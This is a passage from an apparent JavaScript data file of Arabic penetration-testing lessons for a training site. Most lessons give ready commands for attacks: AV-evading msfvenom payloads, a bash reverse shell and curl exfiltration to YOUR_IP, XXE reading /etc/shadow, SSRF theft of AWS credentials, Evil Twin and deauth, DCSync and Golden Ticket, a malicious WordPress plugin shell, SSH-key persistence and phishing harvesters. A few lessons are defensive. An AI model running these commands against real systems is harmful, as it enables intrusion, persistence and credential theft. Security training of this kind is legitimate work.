    { title:"Meterpreter Post-Ex", text:"Meterpreter يوفر أوامر جاهزة.", cmd:"sysinfo && getuid\nhashdump\nrun post/multi/recon/local_exploit_suggester", cmdDesc:"أساسيات Post-Ex" },
    { title:"البحث عن ملفات حساسة", text:"ابحث عن passwords وkeys وconfigs.", cmd:"grep -r 'password' /var/www/html/ 2>/dev/null | head -20\nfind / -name '*.env' -o -name 'id_rsa' 2>/dev/null | head -20", cmdDesc:"البحث عن ملفات حساسة" },
    { title:"نقل الملفات", text:"نقل الأدوات للهدف ونقل النتائج لجهازك.", cmd:"python3 -m http.server 8080\nwget http://ATTACKER/tool.exe", cmdDesc:"نقل الملفات بين الأنظمة" },
    { title:"Pivoting", text:"استخدم الجهاز المخترق للوصول للشبكة الداخلية.", cmd:"use post/multi/manage/shell_to_meterpreter\nroute add 10.10.10.0/24 SESSION_ID", cmdDesc:"Pivoting للشبكة الداخلية" }
  ]
},
{
  id:55, title:"Snort - نظام كشف التسلل", icon:"🐷", level:"intermediate", cat:"defense",
  tags:["Snort","IDS","Network Security","Blue Team"],
  desc:"إعداد واستخدام Snort لكشف الهجمات في الشبكة.",
  steps:[
    { title:"تثبيت Snort", text:"Snort أشهر IDS مفتوح المصدر.", cmd:"apt install snort -y\nsnort -V", cmdDesc:"تثبيت Snort" },
    { title:"وضع الـ Sniffer", text:"Snort يعرض الحزم مثل tcpdump.", cmd:"snort -v -i eth0\nsnort -vd -i eth0", cmdDesc:"تشغيل Snort كـ Sniffer" },
    { title:"كتابة Rules", text:"Rules هي قلب Snort.", cmd:"alert tcp any any -> any 80 (msg:'HTTP Traffic'; sid:1000001; rev:1;)\nalert tcp any any -> $HOME_NET any (msg:'NMAP Scan'; flags:S; sid:1000002; rev:1;)", cmdDesc:"كتابة Snort Rules" },
    { title:"NIDS Mode", text:"NIDS Mode يراقب الشبكة ويسجل التنبيهات.", cmd:"snort -A console -q -c /etc/snort/snort.conf -i eth0", cmdDesc:"تشغيل Snort في وضع NIDS", note:"Suricata بديل حديث أسرع من Snort." }
  ]
},
{
  id:56, title:"اختبار أمان API", icon:"🔌", level:"intermediate", cat:"webapp",
  tags:["API","REST","OWASP API"],
  desc:"منهجية اختبار أمان REST APIs وفق OWASP Top 10.",
  steps:[
    { title:"اكتشاف API Endpoints", text:"البحث عن Swagger/OpenAPI Documentation.", cmd:"ffuf -w common.txt -u http://target.com/FUZZ -mc 200 | grep -i swagger\ncurl http://target.com/swagger.json", cmdDesc:"اكتشاف API Documentation" },
    { title:"BOLA - Object Level Auth", text:"أخطر ثغرة API: تغيير id للوصول لبيانات آخرين.", cmd:"# GET /api/users/1234 (طلب طبيعي)\n# GET /api/users/1235 (هجوم BOLA)", cmdDesc:"اختبار BOLA" },
    { title:"اختبار Mass Assignment", text:"إرسال حقول إضافية قد يرفع صلاحياتك.", cmd:"curl -X POST /api/register -d '{\"username\":\"test\",\"password\":\"123\",\"role\":\"admin\"}'", cmdDesc:"اختبار Mass Assignment" },
    { title:"اختبار Rate Limiting", text:"API بدون Rate Limiting عرضة للـ Brute Force.", cmd:"for i in $(seq 100); do curl -s http://api.target.com/login -d 'user=admin&pass=test'; done", cmdDesc:"اختبار Rate Limiting" }
  ]
},
{
  id:57, title:"Metasploit المتقدم", icon:"🎯", level:"advanced", cat:"exploitation",
  tags:["Metasploit","Advanced","Meterpreter"],
  desc:"تقنيات Metasploit المتقدمة: التهرب من الحماية والـ Pivoting.",
  steps:[
    { title:"تهرب من Antivirus", text:"Encoding يقلل الكشف من AV.", cmd:"msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 15 -f exe > payload.exe", cmdDesc:"إنشاء Payload متهرب من AV" },
    { title:"Pivoting بـ Metasploit", text:"Meterpreter يدعم الـ Pivoting.", cmd:"use post/multi/manage/autoroute\nset SESSION 1\nrun\nuse auxiliary/server/socks_proxy\nrun -j", cmdDesc:"Pivoting بـ Metasploit" },
    { title:"مزامنة Nmap مع Metasploit", text:"استيراد نتائج Nmap لـ Metasploit.", cmd:"db_nmap -sV -sC 192.168.1.0/24\nhosts\nservices", cmdDesc:"Nmap + Metasploit Integration" },
    { title:"Persistence بـ Metasploit", text:"Persistence module يضمن الوصول بعد إعادة التشغيل.", cmd:"run post/linux/manage/sshkey_persistence\nrun post/windows/manage/persistence_exe STARTUP=SCHEDULER", cmdDesc:"تثبيت Persistence" }
  ]
},
{
  id:58, title:"اختبار أمان Docker وKubernetes", icon:"⚓", level:"advanced", cat:"cloud",
  tags:["Docker","Kubernetes","Container Security"],
  desc:"اختبار أمان بيئات Docker وKubernetes.",
  steps:[
    { title:"Docker Security Audit", text:"Trivy يفحص صور Docker بحثاً عن ثغرات.", cmd:"apt install trivy\ntrivy image nginx:latest\ntrivy image myapp:1.0", cmdDesc:"فحص Docker Images بـ Trivy" },
    { title:"Docker Escape", text:"Container بـ --privileged = هروب ممكن.", cmd:"# داخل container:\nls /.dockerenv\nmount /dev/sda1 /mnt\nchroot /mnt /bin/bash", cmdDesc:"هروب من Docker Container" },
    { title:"Kubernetes Enumeration", text:"kubectl يتيح الوصول للـ Cluster.", cmd:"kubectl get pods --all-namespaces\nkubectl get secrets\nkubectl auth can-i --list", cmdDesc:"فحص Kubernetes Cluster" },
    { title:"Kube-bench CIS Benchmark", text:"يفحص إعدادات Kubernetes وفق CIS.", cmd:"docker run --rm -v $(pwd):/host aquasec/kube-bench:latest", cmdDesc:"CIS Benchmark لـ Kubernetes" }
  ]
},
{
  id:59, title:"اختبار أمان Cloud AWS", icon:"☁️", level:"advanced", cat:"cloud",
  tags:["AWS","Cloud Security","S3","IAM"],
  desc:"اكتشاف الإعدادات الخاطئة في بيئات AWS.",
  steps:[
    { title:"فحص S3 Buckets العامة", text:"S3 Buckets بدون تشفير عامة = بيانات للجميع.", cmd:"aws s3 ls s3://bucket-name --no-sign-request\naws s3 cp s3://bucket-name/secret.txt . --no-sign-request", cmdDesc:"فحص S3 Buckets المكشوفة" },
    { title:"فحص IAM Permissions", text:"Enumerate صلاحيات IAM.", cmd:"aws sts get-caller-identity\naws iam list-users\naws iam list-attached-user-policies --user-name USER", cmdDesc:"Enumerate IAM Permissions" },
    { title:"Instance Metadata Service", text:"SSRF في EC2 = AWS Credentials.", cmd:"curl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE", cmdDesc:"استغلال IMDS" },
    { title:"Pacu AWS Exploitation", text:"Pacu مثل Metasploit لكن لـ AWS.", cmd:"git clone https://github.com/RhinoSecurityLabs/pacu.git\ncd pacu && pip3 install -r requirements.txt\npython3 pacu.py", cmdDesc:"استخدام Pacu" }
  ]
},
{
  id:60, title:"بناء مختبر Pentest منزلي", icon:"🏗️", level:"beginner", cat:"basics",
  tags:["Home Lab","VirtualBox","Practice"],
  desc:"دليل شامل لبناء مختبر اختبار الاختراق المنزلي.",
  steps:[
    { title:"المتطلبات والأدوات", text:"تحتاج: جهاز بـ 16GB RAM و100GB HDD وVirtualBox.", cmd:"# تنزيل VirtualBox:\n# https://www.virtualbox.org\n# تنزيل Kali VM:\n# https://www.kali.org/get-kali/#kali-virtual-machines", cmdDesc:"تحميل الأدوات والصور الافتراضية" },
    { title:"إعداد Kali على VirtualBox", text:"Kali VM: 4GB RAM و50GB Disk.", cmd:"# New > Linux > Debian 64-bit\n# RAM: 4096 MB\n# Disk: 50 GB > VDI > Dynamically allocated", cmdDesc:"إعداد Kali Virtual Machine" },
    { title:"بيئات تدريب جاهزة", text:"Metasploitable2 وDVWA للتدريب.", cmd:"# VulnHub:\n# https://www.vulnhub.com\n# Metasploitable2:\n# https://sourceforge.net/projects/metasploitable/", cmdDesc:"تحميل بيئات التدريب" },
    { title:"إعداد شبكة معزولة", text:"Host-Only Network يربط VMs ببعض.", cmd:"# VirtualBox:\n# File > Host Network Manager > Create\n# كل VM: Settings > Network > Host-Only", cmdDesc:"إعداد شبكة معزولة للـ VMs" }
  ]
},
// ===== NEW 30 LESSONS (61-90) =====
{
  id:61, title:"تقنية Evil Twin لشبكات WiFi", icon:"📡", level:"advanced", cat:"wireless",
  tags:["WiFi","Evil Twin","Rogue AP"],
  desc:"إنشاء نقطة وصول وهمية لاعتراض بيانات الاعتماد اللاسلكية.",
  steps:[
    { title:"تجهيز Monitor Mode", text:"تفعيل Monitor Mode على كرت WiFi.", cmd:"sudo airmon-ng check kill\nsudo airmon-ng start wlan0\niwconfig wlan0mon", cmdDesc:"تفعيل Monitor Mode" },
    { title:"مسح الشبكات المحيطة", text:"تحديد الشبكة الهدف.", cmd:"sudo airodump-ng wlan0mon\n# دوّن: BSSID, Channel, ESSID", cmdDesc:"مسح شبكات WiFi" },
    { title:"إنشاء Rogue AP", text:"نقطة وصول وهمية بنفس SSID.", cmd:"sudo airbase-ng -e 'TargetWiFi' -c 6 wlan0mon\nsudo ifconfig at0 up 10.0.0.1/24", cmdDesc:"إنشاء AP وهمي" },
    { title:"Deauth لإجبار العملاء", text:"طرد العملاء من الشبكة الأصلية.", cmd:"sudo aireplay-ng --deauth 0 -a BSSID wlan0mon", cmdDesc:"Deauthentication Attack", note:"للاستخدام على شبكاتك الخاصة فقط." }
  ]
},
{
  id:62, title:"Buffer Overflow - الأساسيات", icon:"💣", level:"advanced", cat:"exploitation",
  tags:["Buffer Overflow","Exploit Dev","GDB"],
  desc:"فهم Buffer Overflow وبناء أول exploit.",
  steps:[
    { title:"تثبيت أدوات التطوير", text:"pwndbg وpwntools للتطوير.", cmd:"apt install gdb pwndbg -y\npip3 install pwntools\napt install python3-pwntools", cmdDesc:"تثبيت أدوات Exploit Dev" },
    { title:"إيجاد نقطة الـ Crash", text:"إرسال بيانات كبيرة حتى يتعطل البرنامج.", cmd:"python3 -c \"print('A'*1000)\" | ./vulnerable_app", cmdDesc:"اختبار Crash" },
    { title:"إيجاد Offset للـ EIP", text:"تحديد عدد البايتات قبل الكتابة فوق EIP.", cmd:"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000\n# في GDB:\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP_VALUE", cmdDesc:"إيجاد Offset" },
    { title:"تحضير Shellcode", text:"توليد shellcode بـ msfvenom.", cmd:"msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b '\\x00' -f python", cmdDesc:"توليد Shellcode" }
  ]
},
{
  id:63, title:"اختبار أمان FTP", icon:"📂", level:"easy", cat:"network",
  tags:["FTP","Brute Force","Anonymous"],
  desc:"فحص خدمة FTP: Anonymous Access وBrute Force والـ Exploits.",
  steps:[
    { title:"فحص FTP بـ Nmap", text:"فحص شامل لخدمة FTP.", cmd:"nmap --script=ftp-anon,ftp-bounce -p 21 192.168.1.10\nnmap -sV -p 21 192.168.1.10", cmdDesc:"فحص FTP الشامل" },
    { title:"اختبار Anonymous Login", text:"FTP Anonymous هو نقطة دخول شائعة.", cmd:"ftp 192.168.1.10\n# Username: anonymous\n# Password: test@test.com\nls -la", cmdDesc:"تسجيل دخول مجهول لـ FTP" },
    { title:"Brute Force FTP", text:"تجربة كلمات مرور شائعة.", cmd:"hydra -l admin -P rockyou.txt ftp://192.168.1.10", cmdDesc:"Brute Force FTP" },
    { title:"Metasploit لاستغلال FTP", text:"البحث عن exploits لإصدار FTP.", cmd:"searchsploit vsftpd\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.10\nrun", cmdDesc:"استغلال FTP بـ Metasploit" }
  ]
},
{
  id:64, title:"تحليل حزم WiFi", icon:"📻", level:"intermediate", cat:"wireless",
  tags:["WiFi","WPA2","PMKID","Handshake"],
  desc:"التقاط وتحليل حزم WiFi للحصول على Handshake.",
  steps:[
    { title:"التقاط Handshake", text:"airodump-ng يلتقط حزم شبكة محددة.", cmd:"sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake wlan0mon", cmdDesc:"التقاط WPA Handshake" },
    { title:"PMKID Attack", text:"PMKID لا يحتاج handshake كامل.", cmd:"sudo hcxdumptool -o pmkid.pcapng -i wlan0mon --enable_status=1\nhcxpcapngtool -o hashes.hc22000 pmkid.pcapng\nhashcat -m 22000 hashes.hc22000 rockyou.txt", cmdDesc:"PMKID Attack على WPA2" },
    { title:"كسر WPA بـ Hashcat GPU", text:"hashcat أسرع لأنه يستخدم GPU.", cmd:"hcxpcapngtool -o handshake.hc22000 handshake-01.cap\nhashcat -m 22000 handshake.hc22000 rockyou.txt", cmdDesc:"كسر WPA بـ GPU" },
    { title:"إيقاف Monitor Mode", text:"إعادة الكرت لوضعه الطبيعي.", cmd:"sudo airmon-ng stop wlan0mon\nsudo systemctl restart NetworkManager", cmdDesc:"إيقاف Monitor Mode" }
  ]
},
{
  id:65, title:"اختبار أمان Telnet", icon:"📺", level:"beginner", cat:"network",
  tags:["Telnet","Plaintext","Sniffing"],
  desc:"فحص Telnet: البروتوكول غير الآمن الذي لا يزال موجوداً.",
  steps:[
    { title:"اكتشاف Telnet", text:"Telnet على Port 23 = خطر كبير.", cmd:"nmap -sV -p 23 192.168.1.0/24\nnmap --script=telnet-encryption 192.168.1.10", cmdDesc:"اكتشاف خدمة Telnet" },
    { title:"الاتصال بـ Telnet", text:"بيانات Telnet ترسل نصاً واضحاً.", cmd:"telnet 192.168.1.10\nnc 192.168.1.10 23", cmdDesc:"الاتصال بـ Telnet" },
    { title:"Sniff بيانات Telnet", text:"Wireshark يعرض كلمة مرور كنص واضح.", cmd:"tshark -i eth0 -Y 'telnet' -T fields -e data\nwireshark", cmdDesc:"Sniffing على Telnet", note:"هذا يُثبت لماذا يجب استبدال Telnet بـ SSH." },
    { title:"Brute Force Telnet", text:"Hydra يدعم Telnet مباشرة.", cmd:"hydra -l root -P rockyou.txt telnet://192.168.1.10", cmdDesc:"Brute Force Telnet" }
  ]
},
{
  id:66, title:"اختبار XXE Injection", icon:"🗝️", level:"advanced", cat:"webapp",
  tags:["XXE","XML","SSRF","OWASP"],
  desc:"اكتشاف واستغلال ثغرات XML External Entity.",
  steps:[
    { title:"اكتشاف XXE", text:"أي تطبيق يعالج XML = نقطة اختبار.", cmd:"# Basic XXE Payload:\n<?xml version='1.0'?>\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM 'file:///etc/passwd'>\n]>\n<root>&xxe;</root>", cmdDesc:"Payload XXE أساسي" },
    { title:"قراءة ملفات بـ XXE", text:"XXE يتيح قراءة ملفات النظام.", cmd:"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>", cmdDesc:"قراءة ملفات النظام" },
    { title:"SSRF عبر XXE", text:"XXE للوصول للخدمات الداخلية.", cmd:"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><foo>&xxe;</foo>", cmdDesc:"SSRF عبر XXE" },
    { title:"Blind XXE", text:"عندما لا تُعرض النتائج مباشرة.", cmd:"<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM 'http://YOUR_SERVER/xxe.dtd'>\n  %xxe;\n]>", cmdDesc:"Blind XXE عبر DTD خارجي" }
  ]
},
{
  id:67, title:"SSRF - Server Side Request Forgery", icon:"🕳️", level:"advanced", cat:"webapp",
  tags:["SSRF","AWS","Internal Network"],
  desc:"اكتشاف واستغلال ثغرات SSRF.",
  steps:[
    { title:"اكتشاف SSRF", text:"أي parameter يقبل URL = نقطة اختبار.", cmd:"curl 'http://target.com/fetch?url=http://127.0.0.1'\ncurl 'http://target.com/image?src=http://169.254.169.254/'", cmdDesc:"اختبار SSRF الأولي" },
    { title:"فحص الشبكة الداخلية", text:"SSRF لاكتشاف الخدمات الداخلية.", cmd:"for port in 22 80 443 3306 6379 8080; do\n  curl -s 'http://target.com/fetch?url=http://192.168.1.1:'$port\ndone", cmdDesc:"فحص منافذ الشبكة الداخلية" },
    { title:"SSRF على AWS Metadata", text:"SSRF في EC2 = AWS Credentials.", cmd:"curl 'http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'", cmdDesc:"سرقة AWS Credentials عبر SSRF" },
    { title:"تجاوز فلاتر SSRF", text:"تقنيات للتهرب من فلاتر.", cmd:"http://2130706433/\nhttp://0x7f000001/\nhttp://target.com@evil.com", cmdDesc:"Bypass فلاتر SSRF" }
  ]
},
{
  id:68, title:"Command Injection وRCE", icon:"🧮", level:"advanced", cat:"webapp",
  tags:["Command Injection","RCE","OS"],
  desc:"اكتشاف واستغلال ثغرات حقن الأوامر للـ RCE.",
  steps:[
    { title:"اكتشاف Command Injection", text:"أي تطبيق ينفذ أوامر OS = خطر.", cmd:"127.0.0.1; id\n127.0.0.1 && whoami\n127.0.0.1 | uname -a", cmdDesc:"اختبار Command Injection" },
    { title:"Reverse Shell من Command Injection", text:"تحويل الثغرة لـ shell تفاعلي.", cmd:"nc -lvnp 4444\n# Payload:\n127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1", cmdDesc:"Reverse Shell" },
    { title:"Blind Command Injection", text:"لا ترى النتيجة مباشرة.", cmd:"127.0.0.1; curl http://YOUR_IP/$(whoami)\n127.0.0.1; nslookup $(id).YOUR_DOMAIN", cmdDesc:"Blind Command Injection" },
    { title:"تثبيت الوصول", text:"بعد RCE ثبّت وصولاً دائماً.", cmd:"# إضافة SSH Key:\nmkdir ~/.ssh\necho 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys", cmdDesc:"تثبيت الوصول بعد RCE" }
  ]
},
{
  id:69, title:"Password Spraying وCredential Stuffing", icon:"🔑", level:"intermediate", cat:"exploitation",
  tags:["Password Spraying","Credential Stuffing","Active Directory"],
  desc:"هجمات Password Spraying وCredential Stuffing على الأنظمة.",
  steps:[
    { title:"ما الفرق؟", text:"Spraying: كلمة مرور واحدة على حسابات كثيرة. Stuffing: بيانات مسربة.", cmd:"# Spraying:\ncrackmapexec smb 192.168.1.10 -u users.txt -p 'Password123' --no-bruteforce\n# Stuffing:\ncrackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt", cmdDesc:"Spraying vs Stuffing" },
    { title:"جمع أسماء المستخدمين", text:"قبل Spraying احتاج قائمة أسماء.", cmd:"enum4linux -U 192.168.1.10\nldapsearch -x -H ldap://DC_IP -b 'dc=corp,dc=local' '(objectClass=user)'", cmdDesc:"جمع أسماء المستخدمين" },
    { title:"Password Spraying بـ Kerbrute", text:"Kerbrute يستخدم Kerberos لعدم قفل الحسابات.", cmd:"kerbrute passwordspray -d corp.local --dc DC_IP users.txt 'Password123'", cmdDesc:"Password Spraying بـ Kerbrute" },
    { title:"تجنب قفل الحسابات", text:"لا تتجاوز حد المحاولات.", cmd:"# عادة الحد 5 محاولات\n# انتظر 30 دقيقة بين الجولات\n# استخدم --delay في crackmapexec", cmdDesc:"تجنب Account Lockout", note:"Password Spraying الخاطئ يقفل الحسابات." }
  ]
},
{
  id:70, title:"اختبار JWT Tokens", icon:"🎫", level:"advanced", cat:"webapp",
  tags:["JWT","Authentication","Token"],
  desc:"اكتشاف واستغلال إعدادات JWT الضعيفة.",
  steps:[
    { title:"فك تشفير JWT", text:"JWT مشفر بـ base64 وليس مؤمناً.", cmd:"echo 'PAYLOAD_BASE64' | base64 -d\npip3 install jwt_tool\njwt_tool TOKEN", cmdDesc:"فك تشفير JWT" },
    { title:"Algorithm None Attack", text:"بعض الخوادم تقبل alg:none = بدون توقيع.", cmd:"jwt_tool TOKEN -X a", cmdDesc:"Algorithm None Attack", note:"إذا نجح = الخادم لا يتحقق من التوقيع." },
    { title:"Weak Secret Key", text:"إذا كان الـ secret قصير يمكن كسره.", cmd:"hashcat -a 0 -m 16500 jwt_token.txt rockyou.txt", cmdDesc:"كسر JWT Secret" },
    { title:"Key Confusion Attack", text:"RS256 مع Public Key كـ HS256 Secret.", cmd:"jwt_tool TOKEN -X k -pk public_key.pem", cmdDesc:"Key Confusion Attack" }
  ]
},
{
  id:71, title:"اختبار أمان WordPress", icon:"🌩️", level:"intermediate", cat:"webapp",
  tags:["WordPress","WPScan","Plugins"],
  desc:"فحص مواقع WordPress وإيجاد الثغرات.",
  steps:[
    { title:"WPScan - فحص WordPress", text:"WPScan مخصص لفحص WordPress.", cmd:"wpscan --url http://target.com\nwpscan --url http://target.com --enumerate u,p,t", cmdDesc:"فحص WordPress بـ WPScan" },
    { title:"فحص الإضافات الضعيفة", text:"أغلب ثغرات WordPress في الإضافات.", cmd:"wpscan --url http://target.com --enumerate p --plugins-detection aggressive", cmdDesc:"فحص الإضافات" },
    { title:"Brute Force تسجيل الدخول", text:"XML-RPC يسمح بـ Brute Force.", cmd:"wpscan --url http://target.com -U admin -P rockyou.txt", cmdDesc:"Brute Force WordPress" },
    { title:"استغلال Plugin ضعيف", text:"بعد الوصول رفع Plugin خبيث.", cmd:"msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw > shell.php\n# ارفعه من Plugins > Add New > Upload", cmdDesc:"رفع Malicious Plugin" }
  ]
},
{
  id:72, title:"اختبار Active Directory المتقدم", icon:"🏰", level:"advanced", cat:"exploitation",
  tags:["Active Directory","DCSync","Golden Ticket","Kerberos"],
  desc:"هجمات AD المتقدمة: DCSync وGolden Ticket والـ Silver Ticket.",
  steps:[
    { title:"DCSync Attack", text:"سرقة هاشات كل المستخدمين من DC.", cmd:"impacket-secretsdump corp.local/Administrator:Password@DC_IP\n# أو في Mimikatz:\nlsadump::dcsync /domain:corp.local /all", cmdDesc:"DCSync لسرقة الهاشات" },
    { title:"Golden Ticket", text:"بعد الحصول على KRBTGT hash = وصول دائم.", cmd:"# في Mimikatz:\nkerberos::golden /domain:corp.local /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:fakeadmin /id:500", cmdDesc:"إنشاء Golden Ticket" },
    { title:"Silver Ticket", text:"بدون KRBTGT: استخدم hash حساب خدمة.", cmd:"kerberos::golden /domain:corp.local /sid:DOMAIN_SID /target:server.corp.local /service:cifs /rc4:SERVICE_HASH /user:admin", cmdDesc:"إنشاء Silver Ticket" },
    { title:"Skeleton Key", text:"Backdoor في LSASS يسمح بمصادقة بأي كلمة مرور.", cmd:"misc::skeleton\n# الآن أي حساب AD يمكن تسجيل دخوله بكلمة: mimikatz", cmdDesc:"Skeleton Key على DC", note:"يتطلب صلاحيات Domain Admin." }
  ]
},
{
  id:73, title:"اختبار أمان الـ Docker Registry", icon:"📦", level:"intermediate", cat:"cloud",
  tags:["Docker","Registry","Container"],
  desc:"اكتشاف واختبار Docker Registry غير المؤمنة.",
  steps:[
    { title:"اكتشاف Registry المكشوفة", text:"Docker Registry بدون مصادقة = وصول للصور.", cmd:"nmap -sV -p 5000 192.168.1.0/24\ncurl http://registry.target.com:5000/v2/_catalog", cmdDesc:"اكتشاف Docker Registry" },
    { title:"سرد الصور المتاحة", text:"استعراض الصور المتاحة.", cmd:"curl http://registry.target.com:5000/v2/_catalog\ncurl http://registry.target.com:5000/v2/image/tags/list", cmdDesc:"سرد صور Docker" },
    { title:"سحب الصور والتحليل", text:"حمّل الصورة وحلل محتوياتها.", cmd:"docker pull registry.target.com:5000/image:tag\ndocker run -it image:tag /bin/bash\ndocker inspect image:tag", cmdDesc:"سحب وتحليل الصور" },
    { title:"فحص الصور بـ Trivy", text:"Trivy يكشف ثغرات في الصور.", cmd:"trivy image registry.target.com:5000/image:tag", cmdDesc:"فحص ثغرات الصور" }
  ]
},
{
  id:74, title:"اختبار أمان المواقع HTTPS", icon:"🔐", level:"intermediate", cat:"network",
  tags:["HTTPS","TLS","SSL","Certificates"],
  desc:"فحص شهادات SSL/TLS وإعداداتها وثغراتها.",
  steps:[
    { title:"فحص TLS بـ testssl.sh", text:"testssl.sh يفحص كل جوانب TLS.", cmd:"apt install testssl.sh\ntestssl.sh https://target.com\ntestssl.sh --severity HIGH https://target.com", cmdDesc:"فحص TLS الشامل" },
    { title:"SSLScan", text:"اكتشاف Protocols وCiphers الضعيفة.", cmd:"sslscan target.com\nsslscan --tls10 --tls11 target.com", cmdDesc:"فحص SSL Protocols والـ Ciphers", note:"TLS 1.0 و1.1 = deprecated." },
    { title:"فحص Heartbleed", text:"CVE-2014-0160 ثغرة OpenSSL الشهيرة.", cmd:"nmap --script=ssl-heartbleed -p 443 target.com", cmdDesc:"فحص ثغرة Heartbleed" },
    { title:"تحقق من إعدادات Certificate", text:"فحص صلاحية الشهادة والإعدادات.", cmd:"openssl s_client -connect target.com:443 | openssl x509 -noout -dates -subject", cmdDesc:"فحص شهادة SSL" }
  ]
},
{
  id:75, title:"اختبار ثغرات قواعد البيانات", icon:"🗄️", level:"intermediate", cat:"database",
  tags:["MySQL","PostgreSQL","MongoDB","NoSQL"],
  desc:"اكتشاف واستغلال قواعد البيانات المكشوفة.",
  steps:[
    { title:"فحص قواعد البيانات", text:"اكتشاف قواعد بيانات مكشوفة.", cmd:"nmap -sV -p 3306,5432,1433,27017 192.168.1.0/24\nnmap --script=mysql-empty-password -p 3306 192.168.1.10", cmdDesc:"فحص قواعد البيانات" },
    { title:"الوصول لـ MySQL", text:"محاولة الوصول بـ credentials افتراضية.", cmd:"mysql -h 192.168.1.10 -u root -p\nmysql -h 192.168.1.10 -u root\nshow databases;", cmdDesc:"الوصول لـ MySQL" },
    { title:"استغلال PostgreSQL", text:"PostgreSQL يدعم COPY لقراءة ملفات.", cmd:"psql -h 192.168.1.10 -U postgres\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';", cmdDesc:"استغلال PostgreSQL" },
    { title:"MongoDB بدون مصادقة", text:"MongoDB القديم بدون auth = وصول كامل.", cmd:"mongosh 192.168.1.10:27017\nshow dbs\ndb.users.find()", cmdDesc:"الوصول لـ MongoDB" }
  ]
},
{
  id:76, title:"هجوم Phishing الاحترافي", icon:"📧", level:"intermediate", cat:"social",
  tags:["Phishing","GoPhish","SET","Social Engineering"],
  desc:"محاكاة هجمات التصيد الاحتيالي باستخدام GoPhish.",
  steps:[
    { title:"GoPhish - منصة Phishing", text:"GoPhish للمحاكاة الاحترافية.", cmd:"wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip\nunzip gophish-linux-64bit.zip\nchmod +x gophish && ./gophish\n# افتح: https://localhost:3333", cmdDesc:"إعداد GoPhish" },
    { title:"SET - Social Engineering Toolkit", text:"SET يوفر قوالب هجمات جاهزة.", cmd:"setoolkit\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester\n# 2) Site Cloner", cmdDesc:"استنساخ موقع لجمع الـ credentials" },
    { title:"إنشاء حملة Phishing", text:"في GoPhish: Campaigns > New Campaign.", cmd:"# Send Email Profile: SMTP settings\n# Landing Page: النموذج الوهمي\n# Email Template: رسالة مقنعة\n# Sending Profile: Target List", cmdDesc:"إعداد حملة في GoPhish" },
    { title:"تحليل نتائج الحملة", text:"من فتح الإيميل؟ من ضغط الرابط؟", cmd:"# GoPhish Dashboard:\n# Campaigns > View Results\n# إحصائيات: Sent, Opened, Clicked, Submitted", cmdDesc:"تحليل إحصائيات الحملة", note:"استخدم للتوعية الأمنية فقط مع إذن مسبق." }
  ]
},
{
  id:77, title:"تأمين نظام Linux - Hardening", icon:"🛡️", level:"intermediate", cat:"defense",
  tags:["Linux Hardening","Security","Firewall","Fail2Ban"],
  desc:"خطوات تقوية أمان نظام Linux بعد التثبيت.",
  steps:[
    { title:"تحديث وتأمين SSH", text:"تقوية إعدادات SSH.", cmd:"sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config\nsed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config\nsystemctl restart sshd", cmdDesc:"تقوية إعدادات SSH" },
    { title:"ضبط Firewall بـ UFW", text:"تفعيل Firewall وفتح المنافذ الضرورية.", cmd:"apt install ufw\nufw default deny incoming\nufw default allow outgoing\nufw allow 22/tcp\nufw enable && ufw status", cmdDesc:"إعداد UFW Firewall" },
    { title:"تفعيل Fail2Ban", text:"Fail2Ban يحجب IPs التي تحاول Brute Force.", cmd:"apt install fail2ban\ncp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local\nsystemctl enable --now fail2ban", cmdDesc:"إعداد Fail2Ban" },
    { title:"فحص الخدمات غير الضرورية", text:"أوقف وأزل الخدمات غير الضرورية.", cmd:"systemctl list-units --type=service --state=running\nsystemctl disable telnet 2>/dev/null\napt remove --purge telnetd", cmdDesc:"إيقاف الخدمات غير الضرورية" }
  ]
},
{
  id:78, title:"اختبار أمان Kubernetes", icon:"⚓", level:"advanced", cat:"cloud",
  tags:["Kubernetes","K8s","RBAC","Secrets"],
  desc:"اختبار إعدادات Kubernetes وإيجاد الثغرات.",
  steps:[
    { title:"Kubernetes Enumeration", text:"فحص صلاحيات Cluster.", cmd:"kubectl get pods --all-namespaces\nkubectl get secrets -A\nkubectl auth can-i --list\nkubectl get clusterroles", cmdDesc:"فحص Kubernetes" },
    { title:"kube-bench CIS Benchmark", text:"فحص إعدادات Kubernetes وفق CIS.", cmd:"docker run --rm -v $(pwd):/host aquasec/kube-bench:latest\nkube-bench run --targets node", cmdDesc:"CIS Benchmark" },
    { title:"استغلال RBAC المفرط", text:"صلاحيات مفرطة = وصول واسع.", cmd:"kubectl get clusterrolebindings -o wide\nkubectl describe clusterrolebinding cluster-admin", cmdDesc:"فحص RBAC" },
    { title:"الوصول لـ Secrets", text:"K8s Secrets قد تحتوي credentials.", cmd:"kubectl get secrets -A\nkubectl get secret SECRET_NAME -o jsonpath='{.data.password}' | base64 -d", cmdDesc:"استخراج Secrets" }
  ]
},
{
